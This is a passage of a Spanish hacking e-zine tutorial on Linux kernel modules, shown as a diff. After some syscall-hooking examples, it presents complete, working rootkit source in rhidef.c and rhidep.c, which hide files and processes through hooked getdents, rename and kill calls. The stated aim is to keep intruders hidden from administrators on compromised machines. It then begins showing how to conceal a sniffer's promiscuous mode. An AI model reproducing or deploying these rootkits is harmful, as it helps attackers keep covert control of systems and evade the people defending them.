+  if (sig!=status.sig) return((*o_kill)(pid, sig));
+  if (pid==status.key) {
+    if (status.mperm==OFF) {
+      status.mperm=ON;
+      sys_call_table[__NR_init_module]=o_init_module;
+      sys_call_table[__NR_delete_module]=o_delete_module;
+      printk("(MP) ModProtect OFF\n");
+    }
+    else {
+      status.mperm=OFF;
+      sys_call_table[__NR_init_module]=my_init_module;
+      sys_call_table[__NR_delete_module]=my_delete_module;
+      printk("(MP) ModProtect ON\n");
+    }
+  }
+  return(0);
+}
+
+int init_module() {
+  printk("(MP) ModProtect By Ripe - <ripe@7a69ezine.org>\n");
+  printk("Unloaded!\n");
+  status.mperm=OFF;       /* De entrada no podemos cargar/descargar nada */
+  status.key=DEF_KEY;
+  status.sig=DEF_SIG;
+  /*
+   * Hookeasmos las sycalls que necesitamos 
+   */
+  o_init_module=sys_call_table[__NR_init_module];
+  o_delete_module=sys_call_table[__NR_delete_module];
+  o_kill=sys_call_table[__NR_kill];
+  sys_call_table[__NR_init_module]=my_init_module;
+  sys_call_table[__NR_delete_module]=my_delete_module;
+  sys_call_table[__NR_kill]=my_kill;
+  return(0);  /* Todo correcto */ 
+}
+
+void cleanup_module() {
+  printk("(MP) ModProtect By Ripe - <ripe@7a69ezine.org>\n");
+  printk("Unloaded!\n");
+  /*
+   * Lo dejamos todo como antes.
+   */
+  sys_call_table[__NR_init_module]=o_init_module;
+  sys_call_table[__NR_delete_module]=o_delete_module;
+  sys_call_table[__NR_kill]=o_kill;
+}
+				
+
+---/ modprotect.c /---
+
+
+     Como podeis ver el modulo es realmente sencillo... pero es efectivo,
+que es lo que cuenta (si ademas es sencillo mejor, porque puedo aprovechar y
+ponerlo de ejemplo aqui :). Vamos a ver si funciona el modulo:
+
+
+    barracuda ~# insmod modprotect.o
+    barracuda ~# rmmod modprotect
+    modprotect: Operation not permitted
+    barracuda ~# insmod hello_goodbye_world.o
+    insmod hello_goodbye_world.o: init_module: Operation not permitted
+
+
+     Perfecto, estamos protegidos ante la carga/descarga de modulos... pero
+ahora queremos cargar uno :P
+
+
+    barracuda ~# kill -31 7469
+    barracuda ~# insmod hello_goodbye_world.o
+    barracuda ~# tail -n 1 /var/log/message
+    May  12 01:43:21 localhost Hello World!
+    barracuda ~#
+    
+    
+     Como podeis ver nuestro primer modulo "util" funciona a la perfeccion.
+Ademas este ejemplo os sirve para ver, tambien, que programar modulos que
+tengan cierta utilidad no requiere codear una gran cantidad de lineas. Esto
+lo veremos tambien en nuestro segundo modulo, segadd3.
+
+     Segadd3 fue el primer modulo serio (aunque no es nada del otro mundo) 
+que yo programe. Lo que hace es ocultar a cada usuario los procesos que no
+son suyos. Para poder hacer esto debemos saber como se las ingenia ps para
+ver los procesos que se estan ejecutando en nuestra maquina, hay varias
+maneras de hacerlo. Podemos ver el codigo fuente, o usat strace, yo me
+decanto por la segunda opcion por ser la mas rapida :)
+
+
+    barracuda ~# strace ps > /dev/null
+    execve("/bin/ps", ["ps"], [/* 19 vars */]) = 0
+    brk(0)                                  = 0x81623a4
+    open("/etc/ld.so.preload", O_RDONLY)    = -1 ENOENT (No such file or directory) 
+    open("/etc/ld.so.cache", O_RDONLY)      = 3
+    fstat(3, {st_mode=S_IFREG|0644, st_size=11774, ...}) = 0
+    old_mmap(NULL, 11774, PROT_READ, MAP_PRIVATE, 3, 0) = 0x40014000
+    close(3)                                = 0
+    open("/lib/libproc.so.2.0.6", O_RDONLY) = 3
+    fstat(3, {st_mode=S_IFREG|0644, st_size=33212, ...}) = 0
+    read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\300\36"..., 4096) = 4096
+    old_mmap(NULL, 46404, PROT_READ|PROT_EXEC, MAP_PRIVATE, 3, 0) = 0x40017000
+    (... etc etc ...)
+    open("/proc", O_RDONLY|O_NONBLOCK|0x10000) = 6
+    fstat(6, {st_mode=S_IFDIR|0555, st_size=0, ...}) = 0
+    fcntl(6, F_SETFD, FD_CLOEXEC)           = 0
+    getdents(6, /* 58 entries */, 984)      = 984
+    (... etc etc ...)
+    _exit(0)                                = ?
+    barracuda ~#
+    
+    
+     Lo tenemos!! Vemos claramente como ps abre /proc y aplica getdents
+sobre su decriptor de fichero. No voy a explicar como funciona esta syscall,
+el que lo quiera saber solo tiene que poner "man 2 getdents". Os recomiendo
+que lo hagas, pues Segadd3 os sera dificil (por no decir imposible) de
+entender si no conoceis bien como funciona esta syscall.
+
+     Y ahora, de sopeton, las fuentes de Segadd3, espero que los comentarios
+que he añadido sean suficientes para su comprension:
+
+---/ segadd3.c /---
+
+/*
+ * TILE: SegAdd3 v1.2 <19/2/2001>
+ * 
+ * CODER: Ripe - <ripe@7a69ezine.org>
+ * 
+ * DESCR: With this modules, only root cat view other EUID process. This
+ *        LKM is very useful if you bestow shell acounts on your system
+ *        and don't want that a user can view olther user process.
+ * 
+ * USAGE: The usage is very simple. You solely must to load the segadd3
+ *        LMK.
+ * 
+ *         root@donasec.com ~# insmod segadd3.o [-f]
+ *         root@donasec.com ~#
+ *
+ * TESTED: This LKM have been tested without problems on:
+ *           - Linux kernel 2.2.18pre10 (Debian 2.2)
+ *           - Linux kernel 2.2.18 (Debian 2.2)
+ * 
+ *         This LKM have been tested whith a strange problem on:
+ *           - Linux kernel 2.2.19 (Slackware 7.1)
+ * 
+ * GRETZ: To YbY for the idea :)
+ *
+ */ 
+
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/ctype.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <linux/fd.h>
+#include <linux/unistd.h>
+#include <linux/fs.h>
+#include <asm/fcntl.h>
+#include <linux/proc_fs.h>
+#include <linux/dirent.h>
+#include <linux/file.h>
+
+#include <sys/syscall.h>
+
+#define _7A69SOFT_
+#define CODER       "Ripe"
+
+extern void *sys_call_table[];
+
+int (*o_getdents)(unsigned int fd, struct dirent *dirp, unsigned int count);
+int (*o_geteuid)(void);
+
+int my_atoi(char *str) {
+  int res=0;
+  int mul=1;
+  char *ptr;
+  for (ptr=str+strlen(str)-1 ; ptr>=str ; ptr--) {
+    if ((*ptr<'0') || (*ptr>'9')) return(-1);
+    res+=(*ptr-'0')*mul;
+    mul*=10;
+  }
+  return(res);
+}
+
+/*
+ * Esta rutina la pille de no se donde... Devuelve la task_struct asociada a
+ * un pid. La usaremos para poder ver quien es el propietario de cada proceso.
+ */
+struct task_struct *get_task_struct(pid_t pid) {
+  struct task_struct *p=current;
+  do {
+    if (p->pid == pid) return p;
+    p=p->next_task;
+  } while (p!=current);
+  return(NULL);
+}
+
+void my_bzero(char *buf, int size) {
+  memset(buf, 0, size);
+}
+
+/*
+ * Este es mi getdents, jejeje.
+ */
+int my_getdents(unsigned int fd, struct dirent *dirp, unsigned int count) {
+  int ret=0;
+  int o_ret=(*o_getdents)(fd, dirp, count); /* Genereamos la salida real  */
+  int euid=(*o_geteuid)();                  /* ¿Quien soy?                */
+  int pid;
+  int tmp=0;
+  struct task_struct *task;
+  struct dirent *dirp_cpy, *dirp_ret, *dirp_cpy2, *dirp_ret2;
+  if (o_ret<=0 || !euid) return(o_ret);   /* Si la salida es 0, o si somos 
+                                             el root, todo lo que viene mas
+					     adelante es inutil :) */
+  dirp_cpy=(struct dirent *)kmalloc(o_ret, GFP_KERNEL);
+  dirp_ret=(struct dirent *)kmalloc(o_ret, GFP_KERNEL);
+  __generic_copy_from_user(dirp_cpy, dirp, o_ret); /* Nos traemos la salida 
+                                                      real hacia el kernel,
+                                                      para poder tratarla. */
+  my_bzero((char *)dirp_ret, o_ret);
+  __generic_copy_to_user(dirp, dirp_ret, o_ret);   /* Con esto dejamos en
+                                                      blanco el dirp */
+  dirp_cpy2=dirp_cpy;
+  dirp_ret2=dirp_ret;
+  while (tmp<o_ret) {
+    tmp=tmp+dirp_cpy2->d_reclen;
+    if (dirp_cpy2->d_reclen==0) break;  
+    pid=my_atoi(dirp_cpy2->d_name);
+    task=get_task_struct((pid_t)pid); /* Pillamos la task_struct */
+    /*
+     * Si el pid es el de un proceso nuestro... adelante, lo copiamos.
+     */
+    if (((task!=NULL) && (task->euid==euid)) || (task==NULL)) {
+      memcpy(dirp_ret2, dirp_cpy2, dirp_cpy2->d_reclen);
+      ret=ret+dirp_cpy2->d_reclen;
+      dirp_ret2=(struct dirent *)((char *)dirp_ret2+dirp_cpy2->d_reclen);
+    }
+    dirp_cpy2=(struct dirent *)((char *)dirp_cpy2+dirp_cpy2->d_reclen); 
+  }
+  __generic_copy_to_user(dirp, dirp_ret, ret);
+  kfree(dirp_cpy);
+  kfree(dirp_ret);
+  return(ret);
+}
+
+/*
+ * Y aqui lo de siempre....
+ */
+int init_module(void) {
+  o_getdents=sys_call_table[__NR_getdents];
+  o_geteuid=sys_call_table[__NR_geteuid];
+  sys_call_table[__NR_getdents]=my_getdents;
+  printk("SegAdd3 v1.2 By Ripe - <ripe@7a69ezine.org>\n");
+  printk("(SA) Loaded!\n");
+  return(0);
+}
+
+void cleanup_module()
+{
+  sys_call_table[__NR_getdents]=o_getdents;
+  printk("SegAdd v1.2 by Ripe - <ripe@7a69ezine.org>\n");
+  printk("(SA) UnLoaded!\n");
+}
+
+MODULE_AUTHOR("Ripe - <ripe@7a69ezine.org>");
+MODULE_DESCRIPTION("Security: Process protection");
+
+---/ segadd3.c /---
+
+    Veamos si funciona bien esta cosa....
+  
+   
+   barracuda ~# insmod segadd3.o
+   barracuda ~# su lripe
+   barracuda /root$ ps aux
+   USER      PID %CPU %MEM   VSZ  RSS  TTY     STAT START   TIME COMMAND
+   lripe     199  0.0  0.4  2008 1216 tty1     S    May11   0:00 bash
+   lripe     212  0.4  0.9  3496 2344 tty1     S    May11   0:00 BitchX
+   lripe     224  0.0  0.4  2008 1212 tty2     S    May11   0:04 bash
+   barracuda /root$
+   
+  
+    Pues parece que si, solo somos capaces de ver nuestros procesos (exepto
+el root que los puede ver todos).
+
+    Esta version de Segadd3 es algo estupida, pues tiene algun que otro
+error. Por ejemplo no comprobamos que el decriptor de fichero pasado a
+getdents() corresponda al directorio /proc, con lo que cualquier fichero que
+tenga como nombre un numero de pid valido sera pasado por el filtro. Ademas
+tiene otro problema, y es que si bien con este modulo evitamos que se puedan
+ver los procesos de los demas (incluso al hacer un "ls /proc" queda oculto),
+se pueden llegar a ver dichos procesos entrando en /proc/<PID>. Esto tiene
+facil solucion, solo tendriamos que parchear la syscall chdir(), pero eso os
+lo dejo a vosotros. Mejorad esta version de Segadd3!!
+
+
+
+
+5. Uso de LKMs para provecho personal (Troyanizando el kernel)
+--------------------------------------------------------------
+
+     Todos sabemos que esto del hacking se esta conviertiendo en una moda
+juvenil. Todos los crios quieren jugar a ser hackers tras ver a zerocool
+haciendo maravillas con su ordenador portatil, es por ello que el numero de
+ataques a servidores se han multiplicado en los ultimos años. Pero lo que
+estos crios no saben es que infiltrarse en una maquina es una tarea
+realmente facil, basta con estar a la ultima en vulnerabilidades. Lo
+realmente dificil es mantenerse oculto en el sistema, que al administrador
+le sea imposible saber que estamos dentro, que no dejemos ni una sola
+huella... para conseguir eso tenemos que colocarnos por encima del
+administrador, ¿Y que hay con mas privilegios que el UID 0? Pues Ring0, el
+kernel. En este seccion voy a explicar las distintas tecnicas que podemos
+usar para lograr mantenernos ocultos en un sistema (ocultacion de ficheros,
+procesos, modos promiscuos en las interfaces de red...). Seguro que habra
+algun kiddie que cojera los modulos aqui publicados y los usara sin
+intresarse lo mas minimo en su funcionamiento, pero bueno, eso a mi no me
+importa demasiado, cada uno es libre de hacer lo que le plazca.
+
+
+
+    
+    5.1. Ocultando ficheros
+    -----------------------
+    
+     Normalmente, cuando logramos acceso a un computador nos es necesario
+dejar ahi determinados ficheros, los logs de un sniffer por ejemplo, cosa
+que puede delatarnos si el administrador del sistema se percata. Obiamente
+podriamos troyanizar "ls", pues es el comando que se suele usar para listar
+el contenido de un directorio, pero nosotros queremos estar seguros de que
+bajo ningun concepto los ficheros que queremos ocultar seran visibles, por
+ello optamos por troyanizar el kernel. Ya hemos visto que para extraer el
+contenido de un directorio se usa la syscall getdents, ya sabemos por donde
+empezar a atacar el kernel.
+
+     ¿Como haremos que el kernel sepa que ocultar y que no? Facil.
+Mantendremos una lista enlacada con todos los ficheros a ocultar, de manera
+que getdents consulte cada una de las entradas para comprovar si esta se
+encuentra en la lista enlazada, y si se encuentra en ella... pues la oculta.
+Es algo realmente facil de hacer.
+
+---/ rhidef.c /---
+
+/*
+ * TILE: RhideF v1.0 <10/5/2001>
+ * 
+ * CODER: Ripe - <ripe@7a69ezine.org>
+ * 
+ * DESCR: This is a file hider LKM. You'll be able ro hide/unhide files 
+ *        using a simple "mv" command. When you insert the module you can
+ *        to specify the magic words to insert and delete file in hide 
+ *        list.
+ * 
+ *        root@donasec.com ~# insmod rhidef.o ins=mete del=saca [-f]
+ *        root@donasec.com ~#
+ * 
+ *        You'll hide a file using "mv <file> mete" and unhide it using
+ *        "mv <file> saca". Easy.
+ * 
+ * RECOM: If you use this LKM in a hacked system I recomend revise the 
+ *        source (script-kidiie sux) and hider this LKM using hider.c :)
+ * 
+ * TESTED: This LKM have been tested without problems on:
+ *           - Linux Kernel 2.2.18pre10 (Debian 2.2)
+ *           - Linux Kernel 2.2.18 (Debian 2.2)
+ */
+
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/ctype.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <linux/proc_fs.h>
+#include <linux/dirent.h>
+
+#include <sys/syscall.h>
+
+#define _7A69SOFT_
+#define CODER       "Ripe"
+#define DEBUGMODE   /* Kiddie protection (aprovecho que los kiddies no len
+                       esto :P) */
+
+#define DEF_INS     "insert_file"
+#define DEF_DEL     "delete_file"
+
+extern void *sys_call_table[];
+
+char *ins;
+char *del;
+
+struct {
+  char *ins;
+  char *del;
+} status;
+
+/*
+ * Estructura que usare para la lista enlazada.
+ */
+typedef struct {
+  char *file;
+  struct lfile *next;
+} lfile;
+
+/*
+ * Puntero que apunta al inicio de la lista enlazada
+ */
+lfile *f_list;
+
+int (*o_rename)(const char *oldpath, const char *newpath);
+int (*o_getdents)(unsigned int fd, struct dirent *dirp, unsigned int count);
+
+void my_bzero(char *buf, int size) {
+  memset(buf, 0, size);
+}
+
+/*
+ * add_file(), del_file(), is_file() son rutinas para el mantenimiento de la
+ * lista enlazada (meter y sacar elementos, comprovar si hay un elemento en la
+ * lista... lo tipico).
+ */  
+void add_file(char *file) {
+  lfile *ptr=f_list;
+#ifdef DEBUGMODE
+  printk("(RF) Adding %s file to hide list\n", file);
+#endif
+  if (is_file(file)==1) return;
+  if (ptr) {
+    while (ptr->next) {
+      if (!strcmp(ptr->file, file)) return;
+      ptr=(lfile *)ptr->next;
+    }
+    ptr->next=(struct lfile *)kmalloc(sizeof(lfile), GFP_KERNEL);
+    ptr=(lfile *)ptr->next;
+    ptr->file=(char *)kmalloc(strlen(file)+1, GFP_KERNEL);
+    strcpy(ptr->file, file);
+    ptr->next=NULL;
+  } else {
+    f_list=(lfile *)kmalloc(sizeof(lfile), GFP_KERNEL);
+    ptr=f_list;
+    ptr->file=(char *)kmalloc(strlen(file)+1, GFP_KERNEL);
+    strcpy(ptr->file, file);
+    ptr->next=NULL;
+  }
+  return;
+}
+
+void del_file(char *file) {
+  lfile *ptr=f_list, *ptr2;
+#ifdef DEBUGMODE
+  printk("(RF) Deleting %s file from hide list\n", file);
+#endif
+  if (!ptr) return;
+  if (!strcmp(ptr->file, file)) {
+    f_list=(lfile *)ptr->next;
+    kfree(ptr->file);
+    kfree(ptr);
+    return;
+  }
+  while(ptr) {
+    if (!strcmp(ptr->file, file)) break;
+    ptr2=ptr;
+    ptr=(lfile *)ptr->next;
+  }
+  if (ptr) {
+    ptr2->next=ptr->next;
+    kfree(ptr->file);
+    kfree(ptr);
+  }
+  return;
+}
+
+int is_file(char *file) {
+  lfile *ptr=f_list;
+  while(ptr) {
+    if (!strcmp(ptr->file, file)) return(1);
+    ptr=(lfile *)ptr->next;
+  }
+  return(0);
+}
+
+/*
+ * Troyanizamos rename, pues sera la syscall que usaremos para comunicarnos
+ * con el kernel solicitandode que oculte/desoculte todos los ficheros con
+ * un determinado nombre usando el comando "mv".
+ */
+int my_rename(const char *oldpath, const char *newpath) {
+  if (!strcmp(newpath, status.ins)) {
+    add_file((char *)oldpath);
+    return(0);
+  }
+  if (!strcmp(newpath, status.del)) {
+    del_file((char *)oldpath);
+    return(0);
+  }
+  return((*o_rename)(oldpath, newpath));
+}
+
+/*
+ * No lo comentare mucho. Mirad los comentarios que he puesto en Segadd3, pues
+ * son aplicables aqui practicamente del mismo modo.
+ */
+int my_getdents(unsigned int fd, struct dirent *dirp, unsigned int count) {
+  int ret=0;
+  int o_ret=(*o_getdents)(fd, dirp, count);
+  int tmp=0;
+  struct task_struct *task;
+  struct dirent *dirp_cpy, *dirp_ret, *dirp_cpy2, *dirp_ret2;
+  if (o_ret<=0) return(o_ret);
+  dirp_cpy=(struct dirent *)kmalloc(o_ret, GFP_KERNEL);
+  dirp_ret=(struct dirent *)kmalloc(o_ret, GFP_KERNEL);
+  __generic_copy_from_user(dirp_cpy, dirp, o_ret);
+  my_bzero((char *)dirp_ret, o_ret);
+  __generic_copy_to_user(dirp, dirp_ret, o_ret);
+  dirp_cpy2=dirp_cpy;
+  dirp_ret2=dirp_ret;
+  while (tmp<o_ret) {
+    tmp=tmp+dirp_cpy2->d_reclen;
+    if (dirp_cpy2->d_reclen==0) break;
+    if (is_file(dirp_cpy2->d_name)==0) {
+      memcpy(dirp_ret2, dirp_cpy2, dirp_cpy2->d_reclen);
+      ret=ret+dirp_cpy2->d_reclen;
+      dirp_ret2=(struct dirent *)((char *)dirp_ret2+dirp_cpy2->d_reclen);
+    }
+    dirp_cpy2=(struct dirent *)((char *)dirp_cpy2+dirp_cpy2->d_reclen);
+  }
+  __generic_copy_to_user(dirp, dirp_ret, ret);
+  kfree(dirp_cpy);
+  kfree(dirp_ret);
+  return(ret);
+}
+
+/*
+ * ¿Digame?
+ */
+int init_module() {
+  status.ins=(char *)kmalloc(strlen(DEF_INS), GFP_KERNEL);
+  status.del=(char *)kmalloc(strlen(DEF_DEL), GFP_KERNEL);
+  strcpy(status.ins, DEF_INS);
+  strcpy(status.del, DEF_DEL);
+  if (ins) {
+    kfree(status.ins);
+    status.ins=ins;
+  }
+  if (del) {
+    kfree(status.del);
+    status.del=del;
+  }
+  o_rename=sys_call_table[__NR_rename];
+  o_getdents=sys_call_table[__NR_getdents];
+  sys_call_table[__NR_rename]=my_rename;
+  sys_call_table[__NR_getdents]=my_getdents;
+#ifdef DEBUGMODE
+  printk("(RF) RhideF by Ripe - <ripe@7a69ezine.org>\n");
+  printk("(RF) Loaded!\n");
+#endif
+  return(0);
+}
+
+void cleanup_module() {
+  sys_call_table[__NR_rename]=o_rename;
+  sys_call_table[__NR_getdents]=o_getdents;
+#ifdef DEBUGMODE
+  printk("(RF) RhideF by Ripe - <ripe@7a69ezine.org>\n");
+  printk("(RF) UnLoaded!\n");
+#endif
+}
+
+MODULE_AUTHOR("Ripe - <ripe@7a69ezine.org>");
+MODULE_DESCRIPTION("hack: File hider");
+MODULE_PARM(ins, "s");
+MODULE_PARM(del, "s");
+
+---/ rhidef.c /---
+
+
+
+
+    5.2 Ocultacion de procesos
+    --------------------------
+    
+     Ya vimos cuando presente el modulo segadd3, que lo que ps hace para
+saber los procesos que en ese momento hay activos en la maquina lee el
+directorio /proc de la mima forma que ls le cualquier otro directoro, usando
+la syscall getdents.
+
+     Seguidamente os muestro rhipep.c, que es un modulo muy similar a
+rhidef.c, pero que se encarga de ocultar los procesos de la lista enlazada.
+Obiamente este modulo tiene los mismos defectos que comentamos en segadd3
+(ver atras), problemes, que por otra parte, tienen facil solucion, como ya
+dije en su momento.
+
+---/ rhidep.c /---
+
+/*
+ * TILE: RhideP v1.0 <10/5/2001>
+ * 
+ * CODER: Ripe - <ripe@7a69ezine.org>
+ * 
+ * DECRP: This is a process hider LKM. In this module you can hide/unhide a
+ *        process using kill syscall. When you insert the module, you can
+ *        pase the hide and unhide signal using "ins" and "del" argument.
+ * 
+ *        root@donasec.com ~# insmod rhidep.o ins=16 del=31 [-f]
+ *        root#donasec.com ~#
+ *  
+ *        Using the example, you'll hide process using "kill -16 <pid>" and
+ *        unhide using "kill-31 <pid>" command.
+ * 
+ * RECOM: If you use this LKM to hide process on a hacked system, is very
+ *        important to hide the module too. To do it you should use the
+ *        hider.c LKM (Good hack!).
+ * 
+ * NOTE: (for Script-kidiies) If you use it the admin will see you ¿Why? :)
+ * 
+ * TESTED: This LKM have been tested without problems on:
+ *           - Linux Kernel 2.2.18pre10 (Debian 2.2)
+ *           - Linux Kernel 2.2.18 (Debian 2.2)
+ */
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/ctype.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <linux/proc_fs.h>
+#include <linux/dirent.h>
+
+#include <sys/syscall.h>
+
+#define _7A69SOFT_
+#define CODER       "Ripe"
+#define DEBUGMODE
+
+#define DEF_INS    16
+#define DEF_DEL    31
+
+extern void *sys_call_table[];
+
+int ins;
+int del;
+
+struct {
+  int ins;
+  int del;
+} status;
+
+typedef struct {
+  pid_t pid;
+  struct lpid *next;
+} lpid;
+
+lpid *p_list;
+
+int (*o_kill)(pid_t pid, int sig);
+int (*o_getdents)(unsigned int fd, struct dirent *dirp, unsigned int count);
+
+int my_atoi(char *str) {
+  int res=0;
+  int mul=1;
+  char *ptr;
+  for(ptr=str+strlen(str)-1 ; ptr>=str ; ptr--) {
+    if ((*ptr<'0') || (*ptr>'9')) return(-1);
+    res+=(*ptr-'0')*mul;
+    mul*=10;
+  }
+  return(res);
+}
+
+void my_bzero(char *buf, int size) {
+  memset(buf, 0, size);
+}
+
+struct task_struct *get_task_struct(pid_t pid) {
+  struct task_struct *p=current;
+  do {
+    if (p->pid==pid) return(p);
+    p=p->next_task;
+  } while (p!=current);
+  return(NULL);
+}
+
+void add_pid(pid_t pid) {
+  lpid *ptr=p_list;
+#ifdef DEBUGMODE
+  printk("(RP) Adding %i pid to hide list\n", pid);
+#endif
+  if (is_pid(pid)==1) return;
+  if (ptr) {
+    while (ptr->next) {
+      if (ptr->pid==pid) return;
+      ptr=(lpid *)ptr->next;
+    }
+    ptr->next=(struct lpid *)kmalloc(sizeof(lpid), GFP_KERNEL);
+    ptr=(lpid *)ptr->next;
+    ptr->pid=pid;
+    ptr->next=NULL;
+  } else {
+    p_list=(lpid *)kmalloc(sizeof(lpid), GFP_KERNEL);
+    ptr=p_list;
+    ptr->pid=pid;
+    ptr->next=NULL;
+  }
+  return;
+}
+
+void del_pid(pid_t pid) {
+  lpid *ptr=p_list, *ptr2;
+#ifdef DEBUGMODE
+  printk("(RP) Deleting %i pid from hide list\n", pid);
+#endif
+  if (!ptr) return;
+  if (ptr->pid==pid) {
+    p_list=(lpid *)ptr->next;
+    kfree(ptr);
+    return;
+  }
+  while(ptr) {
+    if (ptr->pid==pid) break;
+    ptr2=ptr;
+    ptr=(lpid *)ptr->next;
+  }
+  if (ptr) {
+    ptr2->next=ptr->next;
+    kfree(ptr);
+  }
+  return;
+}
+
+int is_pid(pid_t pid) {
+  lpid *ptr=p_list;
+  while(ptr) {
+    if (ptr->pid==pid) return(1);
+    ptr=(lpid *)ptr->next;
+  }
+  return(0);
+}
+
+int my_kill(pid_t pid, int sig) {
+  if (status.ins==sig) {
+    add_pid(pid);
+    return(0);
+  }
+  if (status.del==sig) {
+    del_pid(pid);
+    return(0);
+  }
+  return((*o_kill)(pid, sig));
+}
+
+int my_getdents(unsigned int fd, struct dirent *dirp, unsigned int count) {
+  int ret=0;
+  int o_ret=(*o_getdents)(fd, dirp, count);
+  int pid;
+  int tmp=0;
+  struct task_struct *task;
+  struct dirent *dirp_cpy, *dirp_ret, *dirp_cpy2, *dirp_ret2;
+  if (o_ret<=0) return(o_ret);
+  dirp_cpy=(struct dirent *)kmalloc(o_ret, GFP_KERNEL);
+  dirp_ret=(struct dirent *)kmalloc(o_ret, GFP_KERNEL);
+  __generic_copy_from_user(dirp_cpy, dirp, o_ret);
+  my_bzero((char *)dirp_ret, o_ret);
+  __generic_copy_to_user(dirp, dirp_ret, o_ret);
+  dirp_cpy2=dirp_cpy;
+  dirp_ret2=dirp_ret;
+  while (tmp<o_ret) {
+    tmp=tmp+dirp_cpy2->d_reclen;
+    if (dirp_cpy2->d_reclen==0) break;
+    pid=my_atoi(dirp_cpy2->d_name);
+    task=get_task_struct(pid);
+    if (((task!=NULL) && (is_pid(pid)==0)) || (task==NULL)) {
+      memcpy(dirp_ret2, dirp_cpy2, dirp_cpy2->d_reclen);
+      ret=ret+dirp_cpy2->d_reclen;
+      dirp_ret2=(struct dirent *)((char *)dirp_ret2+dirp_cpy2->d_reclen);
+    }
+    dirp_cpy2=(struct dirent *)((char *)dirp_cpy2+dirp_cpy2->d_reclen);
+  }
+  __generic_copy_to_user(dirp, dirp_ret, ret);
+  kfree(dirp_cpy);
+  kfree(dirp_ret);
+  return(ret);
+}
+   
+int init_module() {
+  status.ins=DEF_INS;
+  status.del=DEF_DEL;
+  if (ins) status.ins=ins;
+  if (del) status.del=del;
+  o_kill=sys_call_table[__NR_kill];
+  o_getdents=sys_call_table[__NR_getdents];
+  sys_call_table[__NR_kill]=my_kill;
+  sys_call_table[__NR_getdents]=my_getdents;
+#ifdef DEBUGMODE
+  printk("(RP) RhideP by Ripe - <ripe@7a69ezine.org>\n");
+  printk("(RP) Loaded!\n");
+#endif
+  return(0);
+}
+
+void cleanup_module() {
+  sys_call_table[__NR_kill]=o_kill;
+  sys_call_table[__NR_getdents]=o_getdents;
+#ifdef DEBUGMODE
+  printk("(RP) RhideP by Ripe - <ripe@7a69ezine.org>\n");
+  printk("(RP) UnLoaded!\n");
+#endif
+}
+
+MODULE_AUTHOR("Ripe - <ripe@7a69ezine.org>");
+MODULE_DESCRIPTION("hack: Process hider");
+MODULE_PARM(ins, "i");
+MODULE_PARM(del, "i");
+
+---/ rhidep.c /---
+
+     Este codigo no esta demasiado comentado, pues creo que si habeis
+entendido bien los demas LKMs presentados este no os sera nada complicado de
+entender, si no lo entiendes... xor eax,eax y jmp eax.
+
+
+
+
+    5.3. Ocultando el modo promiscuo de las interfaces de red
+    ---------------------------------------------------------
+
+     Supongo que todos los que estais leiendo esto sabeis que el kernel de
+nuestro sistema operativo favorito, solo procesa aquellos paquetes que llegan
+por las interfaces de red que van dirigidos a el, por lo que desde la maquina
+solo seria posible leer los paquetes dirigidos a ella. ¿Como trabaja
+entonces un sniffer? Colocando la interface en modo promiscuo. Lo que este
+modo hace es permitir el paso hacia la pila de protocolos de cualquier
+paquete que entre por dicha interface, vaya o no dirigida a esa maquina. El
+estado de una interface de red lo podemos ver usando el comando ifconfig.
+
+
+    barracuda ~# ifconfig eth0    
+    eth0      Link encap:Ethernet  HWaddr 00:E0:29:9A:D0:A9  
+              inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
+              UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+              RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+              TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+              collisions:0 txqueuelen:100 
+              Interrupt:11 Base address:0xdc00 
+    barracuda ~#
+
+  
+     Usando ifconfig es muy facil ver si una interface de red esta en modo
+promiscuo o no, por ello si nosotros colocamos un sniffer en una maquina, el
+administrador del sistema solo necesitara de ifconfig para delatarnos. Pero
+esto es evitable, una vez mas, con un modulo para el kernel, pero esto lo
+veremos dentro de poco, antes veamo que es lo que vera el administrador del
+sistema si eth0 esta en modo promiscuo.
+
+
+    barracuda ~# ifconfig eth0 promisc
+    eth0: Promiscuous mode enable.
+    barracuda ~# ifconfig eth0    
+    eth0      Link encap:Ethernet  HWaddr 00:E0:29:9A:D0:A9  
+              inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
+              UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1
+              RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+              TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+              collisions:0 txqueuelen:100 
+              Interrupt:11 Base address:0xdc00 
+    barracuda ~#
+    
+     
+     Notese ese PROMISC que aprece entre RUNNING y MULTICAST... El
+administrador ha dado con nostros!!
+
+     Si alguna vez habeis programado un sniffer sabreis que para setear los 
+modos de una interface de red usaremos la syscall iotcl, la misma que usaremos
+para comprobarlos. Esta claro donde hay que atacar no?
+
+
+    barracuda ~# strace ifconfig eth0 promisc
+    execve("/sbin/ifconfig", ["ifconfig", "eth0", "promisc"], [/* 18 vars */]) = 0
+    brk(0)                                  = 0x8054544
+    open("/etc/ld.so.preload", O_RDONLY)    = -1 ENOENT (No such file or directory)
+    open("/etc/ld.so.cache", O_RDONLY)      = 3
+    (... etc etc ...)
+    ioctl(4, SIOCGIFFLAGS, 0xbffffbec)      = 0
+    ioctl(4, SIOCSIFFLAGS, 0xbffffbec)      = 0
+    _exit(0)                                = ?
+    barracuda ~#
+
+
+     Como vemos el segundo argumento de ioctl se usa para indicar la accion a
+realizar.
+
+     -> SIOCGIFFLAGS se usa cuando queremos sacar el estado de una interface 
+        de red.
+
+     -> SIOCSIFFLAGS se usa para setear el estado de la interface de red.
+
+     En los casos que tratamos, el tercer argumento sera un puntero a una 
+estructura del tipo ifreq.
+
+---/ include/linux/if.h /---
+
+(...)
+/* Standard interface flags. */
+#define IFF_UP          0x1             /* interface is up              */
+#define IFF_BROADCAST   0x2             /* broadcast address valid      */
